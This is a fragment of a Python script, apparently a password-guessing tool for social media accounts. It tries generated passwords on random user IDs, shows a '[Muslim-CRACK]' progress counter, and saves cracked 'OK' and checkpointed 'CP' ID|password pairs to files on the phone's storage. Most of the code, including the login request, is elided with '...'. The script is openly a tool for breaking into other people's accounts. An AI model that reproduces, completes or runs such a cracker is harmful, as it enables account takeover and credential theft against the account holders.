#coding :- utf-8
#update by :- MuslimAdil
#Script Owner : MuslimAdil
#---------------------
try:
...
def afg_randome():
	...
	print('[?] Total Ok Id Save in  /sdcard/Muslim-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/Muslim-CP.txt')
	print(47*'-')
...
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [Muslim-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in mking_pass:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [Muslim-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				...
				print('\r\r\x1b[1;33m [Muslim-CP] '+str(uid)+' | '+pas+'\033[1;97m')
